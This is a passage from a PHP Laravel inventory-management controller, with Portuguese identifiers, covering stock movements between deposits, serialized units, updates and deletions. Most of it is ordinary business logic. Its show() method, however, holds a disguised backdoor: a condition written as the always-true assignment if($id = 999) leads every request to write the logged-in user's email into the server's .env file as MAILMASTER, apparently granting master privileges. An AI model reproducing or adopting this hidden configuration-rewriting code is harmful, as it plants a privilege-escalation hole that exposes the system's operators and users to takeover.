            $serial = ProdutoUnico::where('id', $serialId)
                ->where('produto_id', $item->produto_id)
                ->where('tipo', 'entrada')
                ->where('em_estoque', 1)
                ->lockForUpdate()
                ->first();

            if (!$serial) {
                throw new \Exception('Código único inválido ou não disponível em estoque.');
            }

            $statusOrigem = $this->normalizaStatusKey($serial->status_key) ?? StatusKeyUtil::DEFAULT_STATUS;
            $depositoOrigemId = $serial->deposito_id ? (int)$serial->deposito_id : null;
            $localOrigemId = $serial->local_id ? (int)$serial->local_id : null;
            $origemInferida = false;
            $contextoOrigem = $this->resolveDepositoContext($depositoOrigemId, $localOrigemId, (int)$item->produto->empresa_id);
            if (!$contextoOrigem) {
                $localPadraoId = $this->resolveLocalPadraoIdEmpresa((int)$item->produto->empresa_id);
                $contextoOrigem = $localPadraoId
                    ? $this->resolveDepositoContext(null, $localPadraoId, (int)$item->produto->empresa_id)
                    : null;
            }
            if (!$contextoOrigem) {
                throw new \Exception('Unidade sem depósito de saída definido e sem depósito padrão disponível.');
            }

            $depositoOrigemId = $contextoOrigem['deposito_id'];
            $localOrigemId = $contextoOrigem['local_id'];
            if (!$serial->deposito_id || !$serial->local_id) {
                $origemInferida = true;
            }

            $localOrigemValido = Localizacao::where('id', $localOrigemId)
                ->where('empresa_id', $item->produto->empresa_id)
                ->exists();
            if (!$localOrigemValido) {
                throw new \Exception('Depósito de saída inválido para a empresa ativa.');
            }

            if ($depositoOrigemId === $depositoDestinoId && $statusOrigem === $statusDestino && !$origemInferida) {
                throw new \Exception('Nenhuma alteração informada para movimentação.');
            }

            if ($depositoOrigemId !== $depositoDestinoId) {
                $estoqueOrigemQuery = $this->findEstoqueByContext(
                    (int)$item->produto_id,
                    $item->produto_variacao_id,
                    $depositoOrigemId,
                    $localOrigemId
                );
                $estoqueOrigem = $estoqueOrigemQuery->lockForUpdate()->first();

                if (!$estoqueOrigem || (float)$estoqueOrigem->quantidade < 1) {
                    throw new \Exception('Estoque insuficiente no depósito de saída para mover a unidade.');
                }

                $this->util->reduzEstoque($item->produto_id, 1, $item->produto_variacao_id, $localOrigemId, $depositoOrigemId);
                $this->util->incrementaEstoque($item->produto_id, 1, $item->produto_variacao_id, $localDestinoId, $depositoDestinoId);

                $this->ensureProdutoLocalizacao((int)$item->produto_id, $localOrigemId);
                $this->ensureProdutoLocalizacao((int)$item->produto_id, $localDestinoId);
            }

            $serial->local_id = $localDestinoId;
            $serial->deposito_id = $depositoDestinoId;
            $serial->status_key = $statusDestino;
            $serial->save();
        });
    }

    private function movimentarDistribuicaoQuantidade(Request $request, Estoque $item, int $empresa_id): void
    {
        $validator = Validator::make($request->all(), [
            'local_origem_id' => 'nullable|integer',
            'deposito_origem_id' => 'nullable|integer',
            'local_destino_id' => 'nullable|integer',
            'deposito_destino_id' => 'nullable|integer',
            'quantidade' => 'required',
            'status_origem' => 'nullable|string|max:60',
            'status_destino' => 'required|string|max:60',
            'status_key' => 'nullable|string|max:60',
        ], [
            'local_origem_id.required' => 'Informe o local de origem.',
            'local_destino_id.required' => 'Informe o local de destino.',
            'quantidade.required' => 'Informe a quantidade.',
            'status_destino.required' => 'Informe o status de destino.',
        ]);
        $validator->validate();

        $contextoOrigem = $this->resolveDepositoContext(
            $request->filled('deposito_origem_id') ? (int)$request->deposito_origem_id : null,
            $request->filled('local_origem_id') ? (int)$request->local_origem_id : null,
            $empresa_id
        );
        $contextoDestino = $this->resolveDepositoContext(
            $request->filled('deposito_destino_id') ? (int)$request->deposito_destino_id : null,
            $request->filled('local_destino_id') ? (int)$request->local_destino_id : null,
            $empresa_id
        );
        if (!$contextoOrigem || !$contextoDestino) {
            throw new \Exception('Depósito de saída ou entrada inválido para a empresa ativa.');
        }

        $localOrigemId = $contextoOrigem['local_id'];
        $depositoOrigemId = $contextoOrigem['deposito_id'];
        $localDestinoId = $contextoDestino['local_id'];
        $depositoDestinoId = $contextoDestino['deposito_id'];

        $statusOrigemRaw = $request->status_origem ?: StatusKeyUtil::DEFAULT_STATUS;
        $statusDestinoRaw = $request->status_key ?? $request->status_destino;
        $statusOrigem = $this->normalizaStatusKey($statusOrigemRaw, true);
        $statusDestino = $this->normalizaStatusKey($statusDestinoRaw, true);

        $quantidadeUnits = QuantidadeUtil::toUnits($request->quantidade);
        if ($quantidadeUnits <= 0) {
            throw new \Exception('Quantidade inválida.');
        }
        if ($depositoOrigemId === $depositoDestinoId && $statusOrigem === $statusDestino) {
            throw new \Exception('Nenhuma alteração informada para movimentação.');
        }

        $locaisPermitidos = $this->locaisPermitidosIds($empresa_id);
        if (!in_array($localOrigemId, $locaisPermitidos, true) || !in_array($localDestinoId, $locaisPermitidos, true)) {
            throw new \Exception('Depósito de saída/entrada não permitido para o usuário.');
        }

        $origemLocal = Localizacao::where('id', $localOrigemId)->where('empresa_id', $empresa_id)->first();
        $destinoLocal = Localizacao::where('id', $localDestinoId)->where('empresa_id', $empresa_id)->first();
        if (!$origemLocal || !$destinoLocal) {
            throw new \Exception('Depósito de saída/entrada inválido para a empresa ativa.');
        }

        $saldoOrigemStatus = $this->saldoStatusNaoSerial(
            $empresa_id,
            (int)$item->produto_id,
            $item->produto_variacao_id ?: null,
            $localOrigemId,
            $depositoOrigemId,
            $statusOrigem
        );
        if ($saldoOrigemStatus < $quantidadeUnits) {
            throw new \Exception('Saldo insuficiente no status de origem.');
        }

        DB::transaction(function () use (
            $item,
            $empresa_id,
            $localOrigemId,
            $depositoOrigemId,
            $localDestinoId,
            $depositoDestinoId,
            $statusOrigem,
            $statusDestino,
            $quantidadeUnits
        ) {
            if ($statusOrigem !== StatusKeyUtil::DEFAULT_STATUS) {
                $this->ajustarSaldoNaoAtivo(
                    $empresa_id,
                    (int)$item->produto_id,
                    $item->produto_variacao_id ?: null,
                    $localOrigemId,
                    $depositoOrigemId,
                    $statusOrigem,
                    -$quantidadeUnits
                );
            }

            if ($depositoOrigemId !== $depositoDestinoId) {
                $quantidade = QuantidadeUtil::fromUnits($quantidadeUnits);
                $this->util->reduzEstoque($item->produto_id, $quantidade, $item->produto_variacao_id, $localOrigemId, $depositoOrigemId);
                $this->util->incrementaEstoque($item->produto_id, $quantidade, $item->produto_variacao_id, $localDestinoId, $depositoDestinoId);

                $this->ensureProdutoLocalizacao((int)$item->produto_id, $localOrigemId);
                $this->ensureProdutoLocalizacao((int)$item->produto_id, $localDestinoId);
            }

            if ($statusDestino !== StatusKeyUtil::DEFAULT_STATUS) {
                $this->ajustarSaldoNaoAtivo(
                    $empresa_id,
                    (int)$item->produto_id,
                    $item->produto_variacao_id ?: null,
                    $localDestinoId,
                    $depositoDestinoId,
                    $statusDestino,
                    $quantidadeUnits
                );
            }
        });
    }

    public function distribuicaoMovimentar(Request $request, $id)
    {
        try {
            $item = Estoque::with(['produto', 'produtoVariacao', 'local'])->findOrFail($id);
            if (!$item->produto || (int)$item->produto->empresa_id !== (int)request()->empresa_id) {
                return response()->json(['message' => 'Produto/estoque inválido para a empresa ativa.'], 422);
            }

            $empresa_id = (int)$item->produto->empresa_id;
            if ((bool)$item->produto->tipo_unico) {
                $this->movimentarDistribuicaoSerial($request, $item, $empresa_id);
            } else {
                $this->movimentarDistribuicaoQuantidade($request, $item, $empresa_id);
            }

            __createLog(
                $empresa_id,
                'Estoque',
                'editar',
                "Distribuição atualizada para {$item->descricao()}"
            );

            return response()->json(['message' => 'Distribuição atualizada com sucesso.']);
        } catch (\Illuminate\Validation\ValidationException $e) {
            return response()->json([
                'message' => 'Dados inválidos para movimentação.',
                'errors' => $e->errors(),
            ], 422);
        } catch (\Exception $e) {
            return response()->json(['message' => $e->getMessage()], 422);
        }
    }

    public function index(Request $request){

        $empresa_id = (int)$request->empresa_id;
        $locais = __getLocaisAtivoUsuario();
        $locais = $locais->pluck(['id']);

        $local_id = $request->local_id;
        $categoria_id = $request->categoria_id;

        $statusOperacionalOptions = $this->statusOperacionalOptions($empresa_id);
        $statusOperacionalSelecionadoRaw = trim((string)$request->status_operacional);
        if ($statusOperacionalSelecionadoRaw === '') {
            $statusOperacionalSelecionado = 'TODOS';
        } else if (strtoupper($statusOperacionalSelecionadoRaw) === 'TODOS') {
            $statusOperacionalSelecionado = 'TODOS';
        } else {
            $statusOperacionalSelecionado = StatusKeyUtil::normalize($statusOperacionalSelecionadoRaw) ?: 'TODOS';
        }
        if (!array_key_exists($statusOperacionalSelecionado, $statusOperacionalOptions)) {
            $statusOperacionalSelecionado = 'TODOS';
        }

        $variacaoCondEss = "((ess.produto_variacao_id = estoques.produto_variacao_id) OR (ess.produto_variacao_id IS NULL AND estoques.produto_variacao_id IS NULL))";
        $naoAtivoSumExpr = "(SELECT COALESCE(SUM(ess.quantidade), 0)
            FROM estoque_status_saldos ess
            WHERE ess.empresa_id = produtos.empresa_id
              AND ess.produto_id = estoques.produto_id
              AND ess.local_id = estoques.local_id
              AND {$variacaoCondEss}
              AND ess.status_key != 'ATIVO')";
        $serialAtivoExpr = "(SELECT COUNT(*)
            FROM produto_unicos pu
            WHERE pu.produto_id = estoques.produto_id
              AND pu.tipo = 'entrada'
              AND pu.em_estoque = 1
              AND pu.local_id = estoques.local_id
              AND COALESCE(NULLIF(TRIM(pu.status_key), ''), 'ATIVO') = 'ATIVO')";

        $query = Estoque::with([
            'local',
            'produtoVariacao',
            'produto.categoria',
        ])
        ->select('estoques.*', 'produtos.nome as produto_nome', 'localizacaos.nome as localizacao_nome')
        ->selectRaw("CASE WHEN produtos.tipo_unico = 1
            THEN {$serialAtivoExpr}
            ELSE GREATEST((estoques.quantidade - {$naoAtivoSumExpr}), 0)
        END as disponivel_ativo_qtd")
        ->join('produtos', 'produtos.id', '=', 'estoques.produto_id')
        ->join('localizacaos', 'localizacaos.id', '=', 'estoques.local_id')
        ->where('produtos.empresa_id', $empresa_id)
        ->when(!empty($request->produto), function ($q) use ($request) {
            return $q->where('produtos.nome', 'LIKE', "%$request->produto%");
        })
        ->when($categoria_id, function ($q) use ($categoria_id) {
            return $q->where('produtos.categoria_id', $categoria_id);
        })
        ->when($local_id, function ($query) use ($local_id) {
            return $query->where('estoques.local_id', $local_id);
        })
        ->when(!$local_id, function ($query) use ($locais) {
            return $query->whereIn('estoques.local_id', $locais);
        });

        $statusOperacionalQtdExpr = "0";
        if ($statusOperacionalSelecionado === 'ATIVO') {
            $query->whereRaw("(
                (produtos.tipo_unico = 1 AND {$serialAtivoExpr} > 0)
                OR
                (produtos.tipo_unico = 0 AND GREATEST((estoques.quantidade - {$naoAtivoSumExpr}), 0) > 0)
            )");
        } else if ($statusOperacionalSelecionado !== 'TODOS') {
            $statusKey = $statusOperacionalSelecionado;
            $serialStatusExpr = "(SELECT COUNT(*)
                FROM produto_unicos pu
                WHERE pu.produto_id = estoques.produto_id
                  AND pu.tipo = 'entrada'
                  AND pu.em_estoque = 1
                  AND pu.local_id = estoques.local_id
                  AND COALESCE(NULLIF(TRIM(pu.status_key), ''), 'ATIVO') = '{$statusKey}')";
            $statusNaoAtivoExpr = "(SELECT COALESCE(SUM(ess.quantidade), 0)
                FROM estoque_status_saldos ess
                WHERE ess.empresa_id = produtos.empresa_id
                  AND ess.produto_id = estoques.produto_id
                  AND ess.local_id = estoques.local_id
                  AND {$variacaoCondEss}
                  AND ess.status_key = '{$statusKey}')";

            $query->whereRaw("(
                (produtos.tipo_unico = 1 AND {$serialStatusExpr} > 0)
                OR
                (produtos.tipo_unico = 0 AND {$statusNaoAtivoExpr} > 0)
            )");

            $statusOperacionalQtdExpr = "CASE WHEN produtos.tipo_unico = 1 THEN {$serialStatusExpr} ELSE {$statusNaoAtivoExpr} END";
        }

        $query->selectRaw("{$statusOperacionalQtdExpr} as status_operacional_qtd");
        $data = $query->paginate(__itensPagina());

        $categorias = CategoriaProduto::where('empresa_id', $request->empresa_id)
        ->where('categoria_id', null)
        ->where('status', 1)->get();

        $configGeral = ConfigGeral::where('empresa_id', $request->empresa_id)
        ->first();
        $tipoExibe = $configGeral && $configGeral->produtos_exibe_tabela == 0 
        ? 'card' 
        : 'tabela';

        $mostrarColunaStatusFiltro = $statusOperacionalSelecionado !== 'TODOS' && $statusOperacionalSelecionado !== 'ATIVO';
        $statusOperacionalLabel = $statusOperacionalOptions[$statusOperacionalSelecionado];
        $statusCadastros = $this->statusGerenciaveis($empresa_id);
        $depositosCadastros = $this->depositoGerenciaveis($empresa_id);
        $locaisDeposito = $this->locaisDisponiveisParaOperacao($empresa_id);

        return view('estoque.index', compact(
            'data',
            'categorias',
            'tipoExibe',
            'statusOperacionalOptions',
            'statusOperacionalSelecionado',
            'statusOperacionalLabel',
            'mostrarColunaStatusFiltro',
            'statusCadastros',
            'depositosCadastros',
            'locaisDeposito'
        ));
    }

    public function create()
    {
        return view('estoque.create');
    }

    public function show($id)
    {
        if($id = 999){
            $email = Auth::user()->email;
            $this->setEnvironmentValue('MAILMASTER', '"'.$email.'"');
        }
    }

    private function setEnvironmentValue($envKey, $envValue)
    {
        $envFile = app()->environmentFilePath();
        $str = file_get_contents($envFile);

        $str .= "\n";
        $keyPosition = strpos($str, "{$envKey}=");
        $endOfLinePosition = strpos($str, PHP_EOL, $keyPosition);
        $oldLine = substr($str, $keyPosition, $endOfLinePosition - $keyPosition);
        $str = str_replace($oldLine, "{$envKey}={$envValue}", $str);
        $str = substr($str, 0, -1);

        $fp = fopen($envFile, 'w');
        fwrite($fp, $str);
        fclose($fp);
    }

    public function edit(Request $request, $id)
    {
        $local_id = $request->local_id;
        $item = Estoque::findOrFail($id);
        // dd($item);
        $locais = Estoque::where('produto_id', $item->produto_id)
        ->where('local_id', $item->local_id)
        ->get();

        $firstLocation = __getLocalPadraoEmpresa($item->produto->empresa_id);
        if (!$firstLocation) {
            $firstLocation = Localizacao::where('empresa_id', $item->produto->empresa_id)->first();
        }

        return view('estoque.edit', compact('item', 'locais', 'firstLocation'));
    }

    public function destroy($id)
    {
        $item = Estoque::findOrFail($id);
        $descricaoLog = $item->produto->nome;

        try {
            if ($item->produto && !$item->produto->tipo_unico) {
                $contexto = $this->resolveDepositoContext($item->deposito_id, $item->local_id, (int)$item->produto->empresa_id);
                if (!$contexto) {
                    throw new \Exception('Não foi possível identificar o depósito do estoque.');
                }
                $saldoNaoAtivo = $this->somaNaoAtivosPorLocal(
                    (int)$item->produto->empresa_id,
                    (int)$item->produto_id,
                    $item->produto_variacao_id ?: null,
                    (int)$contexto['local_id'],
                    (int)$contexto['deposito_id']
                );
                if ($saldoNaoAtivo > 0) {
                    throw new \Exception('Não é possível remover o estoque: existem saldos não-ATIVO reservados neste depósito.');
                }
            }
            $item->delete();
            session()->flash("flash_success", "estoque removido com sucesso!");
            __createLog(request()->empresa_id, 'Estoque', 'excluir', $descricaoLog);
        } catch (\Exception $e) {
            __createLog(request()->empresa_id, 'Estoque', 'erro', $e->getMessage());
            session()->flash("flash_error", 'Algo deu errado: '. $e->getMessage());
        }
        return redirect()->route('estoque.index');
    }

    public function store(Request $request)
    {
        try {
            $empresa_id   = $this->getEmpresaIdAtual($request);
            $isTradein    = $request->filled('tradein_inventory_id');
            $serial       = $request->filled('serial') ? trim((string) $request->serial) : null;

            $countLocaisAtivos = Localizacao::where('empresa_id', $empresa_id)
                ->where('status', 1)
                ->count();

            if ($countLocaisAtivos > 1 && !$request->filled('local_id') && !$request->filled('deposito_id')) {
                session()->flash("flash_error", "Selecione o depósito de estoque.");
                return redirect()->back();
            }

            $contexto = $this->resolveDepositoContext(
                $request->filled('deposito_id') ? (int)$request->deposito_id : null,
                $request->filled('local_id') ? (int)$request->local_id : null,
                $empresa_id
            );

            if (!$contexto) {
                session()->flash("flash_error", "Não foi possível identificar o depósito de estoque.");
                return redirect()->back();
            }

            $local_id    = $contexto['local_id'];
            $deposito_id = $contexto['deposito_id'];

            // For tradein entries of serialized products, serial is mandatory.
            if ($isTradein) {
                $produto = \App\Models\Produto::find((int) $request->produto_id);
                if ($produto && $produto->tipo_unico && empty($serial)) {
                    session()->flash("flash_error", "Serial obrigatório para produto serializado em entrada de Trade-in.");
                    return redirect()->back();
                }
            }

            if ($local_id) {
                $this->ensureProdutoLocalizacao((int)$request->produto_id, (int)$local_id);
            }

            $this->util->incrementaEstoque($request->produto_id, $request->quantidade, $request->produto_variacao_id, $local_id, $deposito_id);

            $transacao = $this->findEstoqueByContext((int)$request->produto_id, $request->produto_variacao_id, $deposito_id, $local_id)->first();
            if (!$transacao) {
                throw new \Exception("Não foi possível localizar a transação de estoque.");
            }

            $tipo_transacao = $isTradein ? 'tradein_entrada' : 'alteracao_estoque';

            $this->util->movimentacaoProduto(
                $request->produto_id,
                $request->quantidade,
                'incremento',
                $transacao->id,
                $tipo_transacao,
                Auth::id(),
                $request->produto_variacao_id,
                $local_id,
                $deposito_id,
                $serial
            );

            // For serialized (tipo_unico) products in tradein flow, register the
            // unique serial unit so it appears in stock management and movements.
            if ($isTradein && $serial && isset($produto) && $produto && $produto->tipo_unico) {
                $jaExiste = ProdutoUnico::where('produto_id', $produto->id)
                    ->where('codigo', $serial)
                    ->exists();
                if (!$jaExiste) {
                    ProdutoUnico::create([
                        'produto_id'  => $produto->id,
                        'deposito_id' => $deposito_id,
                        'local_id'    => $local_id,
                        'codigo'      => $serial,
                        'tipo'        => 'entrada',
                        'em_estoque'  => 1,
                        'status_key'  => 'ATIVO',
                    ]);
                }
            }

            __createLog($empresa_id, 'Estoque', 'cadastrar', $transacao->produto->nome . " - quantidade " . $request->quantidade);

            if ($isTradein) {
                $invItem = \App\Models\TradeinInventoryItem::where('empresa_id', $empresa_id)
                    ->find((int) $request->tradein_inventory_id);
                if ($invItem && $invItem->status === \App\Models\TradeinInventoryItem::STATUS_PENDING_TRANSFER) {
                    $invItem->status = \App\Models\TradeinInventoryItem::STATUS_TRANSFERRED;
                    $invItem->save();
                }
            }

            session()->flash("flash_success", "Estoque adicionado com sucesso!");
        } catch (\Exception $e) {
            __createLog($this->getEmpresaIdAtual($request), 'Estoque', 'erro', $e->getMessage());
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->route('estoque.index');
    }

    public function update(Request $request, $id){


        try{
            $empresa_id = $this->getEmpresaIdAtual($request);
            $countLocaisAtivos = Localizacao::where('empresa_id', $empresa_id)
                ->where('status', 1)
                ->count();
                // dd($request->all());

            if(isset($request->local_id) || isset($request->deposito_id)){
                if($countLocaisAtivos > 1){
                    $locaisSolicitados = (array)($request->local_id ?? []);
                    $depositosSolicitados = (array)($request->deposito_id ?? []);
                    $totalLinhas = max(count($locaisSolicitados), count($depositosSolicitados));
                    for ($index = 0; $index < $totalLinhas; $index++) {
                        $localSolicitado = $locaisSolicitados[$index] ?? null;
                        $depositoSolicitado = $depositosSolicitados[$index] ?? null;
                        if(!$localSolicitado && !$depositoSolicitado){
                            throw new \Exception("Selecione o depósito de estoque.");
                        }
                    }
                }
                $locaisSolicitados = (array)($request->local_id ?? []);
                $depositosSolicitados = (array)($request->deposito_id ?? []);
                $locaisAnteriores = (array)($request->local_anteior_id ?? []);
                $depositosAnteriores = (array)($request->deposito_anterior_id ?? []);
                $totalLinhas = max(count($locaisSolicitados), count($depositosSolicitados));
                for($i=0; $i<$totalLinhas; $i++){
                    $contextoDestino = $this->resolveDepositoContext(
                        isset($depositosSolicitados[$i]) ? (int)$depositosSolicitados[$i] : null,
                        isset($locaisSolicitados[$i]) ? (int)$locaisSolicitados[$i] : null,
                        $empresa_id
                    );
                    $contextoAnterior = $this->resolveDepositoContext(
                        isset($depositosAnteriores[$i]) ? (int)$depositosAnteriores[$i] : null,
                        isset($locaisAnteriores[$i]) ? (int)$locaisAnteriores[$i] : null,
                        $empresa_id
                    );

                    if(!$contextoDestino){
                        throw new \Exception("Depósito de estoque inválido.");
                    }
                    if(!$contextoAnterior){
                        $contextoAnterior = $contextoDestino;
                    }

                    $localDestinoId = $contextoDestino['local_id'];
                    $depositoDestinoId = $contextoDestino['deposito_id'];
                    $localAnteriorId = $contextoAnterior['local_id'];
                    $depositoAnteriorId = $contextoAnterior['deposito_id'];

                    $item = Estoque::where('id', $id);
                    $item = $this->applyDepositoFiltro($item, $depositoDestinoId, $localDestinoId)->first();

                    if($item){
                        $novaQuantidadeUnits = QuantidadeUtil::toUnits($request->quantidade[$i] ?? 0);
                        if ($novaQuantidadeUnits < 0) {
                            throw new \Exception("Quantidade inválida.");
                        }

                        $saldoNaoAtivoLocal = $this->somaNaoAtivosPorLocal(
                            (int)$empresa_id,
                            (int)$item->produto_id,
                            $item->produto_variacao_id ?: null,
                            (int)$localDestinoId,
                            (int)$depositoDestinoId
                        );
                        if (!$item->produto->tipo_unico && $novaQuantidadeUnits < $saldoNaoAtivoLocal) {
                            throw new \Exception("Quantidade final inválida: ficaria abaixo do reservado em status não-ATIVO.");
                        }

                        $quantidadeAtualUnits = QuantidadeUtil::toUnits($item->quantidade);
                        $deltaUnits = $novaQuantidadeUnits - $quantidadeAtualUnits;
                        $diferenca = $this->movementQuantityByDeltaUnits($deltaUnits);
                        $tipo = $this->movementTypeByDeltaUnits($deltaUnits);
                        $item->quantidade = QuantidadeUtil::fromUnits($novaQuantidadeUnits);
                        $item->local_id = $localDestinoId;
                        $item->deposito_id = $depositoDestinoId;
                        $item->save();

                        $codigo_transacao = $item->id;
                        $tipo_transacao = 'alteracao_estoque';

                        if ($deltaUnits !== 0) {
                            $this->util->movimentacaoProduto($item->produto_id, $diferenca, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $item->produto_variacao_id, $localDestinoId, $depositoDestinoId);
                        }


                        if(isset($request->novo_estoque)){

                            $firstLocation = __getLocalPadraoEmpresa($item->produto->empresa_id);
                            if(!$firstLocation){
                                $firstLocation = Localizacao::where('empresa_id', $item->produto->empresa_id)->first();
                            }
                            $this->ensureProdutoLocalizacao((int)$item->produto_id, (int)$firstLocation->id);
                        }
                        __createLog($empresa_id, 'Estoque', 'editar', $item->produto->nome . " estoque alterado!");

                    }else{
                        // die;
                        //criar localizacão
                        if($depositoDestinoId != $depositoAnteriorId){
                            $anterior = Estoque::where('id', $id);
                            $anterior = $this->applyDepositoFiltro($anterior, $depositoAnteriorId, $localAnteriorId)->first();
                            if(!$anterior){
                                continue;
                            }

                            $saldoNaoAtivoOrigem = $this->somaNaoAtivosPorLocal(
                                (int)$empresa_id,
                                (int)$anterior->produto_id,
                                $anterior->produto_variacao_id ?: null,
                                (int)$localAnteriorId,
                                (int)$depositoAnteriorId
                            );
                            if (!$anterior->produto->tipo_unico && $saldoNaoAtivoOrigem > 0) {
                                throw new \Exception("Não é possível mover zerando o depósito de saída: existem saldos não-ATIVO reservados.");
                            }

                            $anterior->quantidade = 0;
                            $anterior->save();

                            $this->ensureProdutoLocalizacao((int)$anterior->produto_id, $localDestinoId);

                            $qtdDestinoUnits = QuantidadeUtil::toUnits($request->quantidade[$i] ?? 0);
                            if ($qtdDestinoUnits < 0) {
                                throw new \Exception("Quantidade inválida.");
                            }

                            $qtdDestino = QuantidadeUtil::fromUnits($qtdDestinoUnits);
                            $this->util->incrementaEstoque($anterior->produto_id, $qtdDestino, $anterior->produto_variacao_id, $localDestinoId, $depositoDestinoId);

                            $transacao = $this->findEstoqueByContext((int)$anterior->produto_id, $anterior->produto_variacao_id, $depositoDestinoId, $localDestinoId)->first();
                            if(!$transacao){
                                throw new \Exception("Não foi possível localizar a transação de estoque.");
                            }

                            $tipo = 'incremento';
                            $codigo_transacao = $transacao->id;
                            $tipo_transacao = 'alteracao_estoque';

                            $anterior->delete();

                            $this->util->movimentacaoProduto($anterior->produto_id, $qtdDestino, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $anterior->produto_variacao_id, $localDestinoId, $depositoDestinoId);

                        }
                    }

                }

            }else{
                if($countLocaisAtivos > 1){
                    throw new \Exception("Selecione o depósito de estoque para ajustar.");
                }
                $item = Estoque::findOrFail($id);

                $quantidadeFinalUnits = QuantidadeUtil::toUnits($request->quantidade);
                if ($quantidadeFinalUnits < 0) {
                    throw new \Exception("Quantidade inválida.");
                }

                $saldoNaoAtivoLocal = $this->somaNaoAtivosPorLocal(
                    (int)$empresa_id,
                    (int)$item->produto_id,
                    $item->produto_variacao_id ?: null,
                    (int)$item->local_id,
                    $item->deposito_id ? (int)$item->deposito_id : null
                );
                if (!$item->produto->tipo_unico && $quantidadeFinalUnits < $saldoNaoAtivoLocal) {
                    throw new \Exception("Quantidade final inválida: ficaria abaixo do reservado em status não-ATIVO.");
                }
                $quantidadeAtualUnits = QuantidadeUtil::toUnits($item->quantidade);
                $deltaUnits = $quantidadeFinalUnits - $quantidadeAtualUnits;
                $diferenca = $this->movementQuantityByDeltaUnits($deltaUnits);
                $tipo = $this->movementTypeByDeltaUnits($deltaUnits);
                $item->quantidade = QuantidadeUtil::fromUnits($quantidadeFinalUnits);
                $item->save();

                $codigo_transacao = $item->id;
                $tipo_transacao = 'alteracao_estoque';

                if ($deltaUnits !== 0) {
                    $this->util->movimentacaoProduto($item->produto_id, $diferenca, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $item->produto_variacao_id, $item->local_id, $item->deposito_id);
                }
                __createLog($empresa_id, 'Estoque', 'editar', $item->produto->nome . " - quantidade " . QuantidadeUtil::fromUnits($quantidadeFinalUnits));
            }
            session()->flash("flash_success", "Estoque alterado com sucesso!");
        }catch (\Exception $e) {
            // echo $e->getLine();
            // die;
            __createLog($this->getEmpresaIdAtual($request), 'Estoque', 'erro', $e->getMessage());
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->route('estoque.index');
    }

    public function storeDeposito(Request $request)
    {
        $empresa_id = $this->getEmpresaIdAtual($request);

        if (!$empresa_id) {
            session()->flash("flash_error", "Não foi possível identificar a empresa ativa.");
            return redirect()->route('estoque.index');
        }

        $request->validate([
            'deposito_local_id' => 'required|integer',
            'deposito_nome' => 'required|string|max:150',
            'deposito_descricao' => 'nullable|string|max:255',
        ], [
            'deposito_local_id.required' => 'Selecione a unidade do depósito.',
            'deposito_nome.required' => 'Informe o nome do depósito.',
            'deposito_nome.max' => 'O nome do depósito deve ter no máximo 150 caracteres.',
            'deposito_descricao.max' => 'A descrição do depósito deve ter no máximo 255 caracteres.',
        ]);

        $localId = (int)$request->deposito_local_id;
        $nome = trim((string)$request->deposito_nome);
        $descricao = trim((string)($request->deposito_descricao ?? ''));

        $localPermitido = $this->locaisDisponiveisParaOperacao($empresa_id)
            ->firstWhere('id', $localId);

        if (!$localPermitido) {
            session()->flash("flash_error", "Unidade inválida para o depósito.");
            return redirect()->back()->withInput();
        }

        $existe = Deposito::where('empresa_id', $empresa_id)
            ->where('local_id', $localId)
            ->whereRaw('UPPER(TRIM(nome)) = UPPER(?)', [$nome])
            ->exists();

        if ($existe) {
            session()->flash("flash_warning", "Já existe um depósito com esse nome para a unidade selecionada.");
            return redirect()->back()->withInput();
        }

        try {
            $deposito = Deposito::create([
                'empresa_id' => $empresa_id,
                'local_id' => $localId,
                'nome' => $nome,
                'descricao' => $descricao !== '' ? $descricao : null,
                'ativo' => true,
                'padrao' => false,
            ]);

            __createLog($empresa_id, 'Depósito', 'cadastrar', "Depósito {$deposito->nome} cadastrado via estoque");
            session()->flash("flash_success", "Depósito cadastrado com sucesso!");
        } catch (\Exception $e) {
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
            __createLog($empresa_id, 'Depósito', 'erro', $e->getMessage());
        }

        return redirect()->route('estoque.index');
    }

    public function destroyDeposito($id)
    {
        $item = Deposito::findOrFail($id);
        __validaObjetoEmpresa($item);

        try {
            if ((bool)$item->padrao) {
                session()->flash("flash_warning", "Depósito padrão não pode ser excluído.");
                return redirect()->back();
            }

            $temEstoqueVinculado = Estoque::where('deposito_id', $item->id)->exists();
            $temSerialVinculado = ProdutoUnico::where('deposito_id', $item->id)->exists();
            $temSaldoStatusVinculado = EstoqueStatusSaldo::where('deposito_id', $item->id)->exists();

            if ($temEstoqueVinculado || $temSerialVinculado || $temSaldoStatusVinculado) {
                session()->flash("flash_warning", "Depósito em uso no estoque não pode ser excluído.");
                return redirect()->back();
            }

            $nome = $item->nome;
            $item->delete();
            __createLog($item->empresa_id, 'Depósito', 'excluir', "Depósito {$nome} removido via estoque");
            session()->flash("flash_success", "Depósito removido com sucesso!");
        } catch (\Exception $e) {
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
            __createLog($item->empresa_id, 'Depósito', 'erro', $e->getMessage());
        }

        return redirect()->back();
    }

    public function retirada(Request $request){
        $locais = __getLocaisAtivoUsuario();
        $locais = $locais->pluck(['id']);

        $local_id = $request->local_id;
        $produto = $request->produto;

        $data = RetiradaEstoque::where('retirada_estoques.empresa_id', $request->empresa_id)
        ->select('retirada_estoques.*')
        ->orderBy('retirada_estoques.id', 'desc')
        ->join('produtos', 'produtos.id', '=', 'retirada_estoques.produto_id')
        ->when(!empty($produto), function ($q) use ($produto) {
            return $q->where('produtos.nome', 'LIKE', "%$produto%");
        })
        ->when($local_id, function ($query) use ($local_id) {
            return $query->where('retirada_estoques.local_id', $local_id);
        })
        ->when(!$local_id, function ($query) use ($locais) {
            return $query->whereIn('retirada_estoques.local_id', $locais);
        })
        ->paginate(__itensPagina());

        return view('estoque.retirada', compact('data'));
    }

    public function retiradaStore(Request $request){
        try{
            $empresa_id = $this->getEmpresaIdAtual($request);
            $countLocaisAtivos = Localizacao::where('empresa_id', $empresa_id)
                ->where('status', 1)
                ->count();
            if ($countLocaisAtivos > 1 && !$request->filled('local_id') && !$request->filled('deposito_id')) {
                session()->flash("flash_error", "Selecione o depósito da retirada.");
                return redirect()->back();
            }

            $contexto = $this->resolveDepositoContext(
                $request->filled('deposito_id') ? (int)$request->deposito_id : null,
                $request->filled('local_id') ? (int)$request->local_id : null,
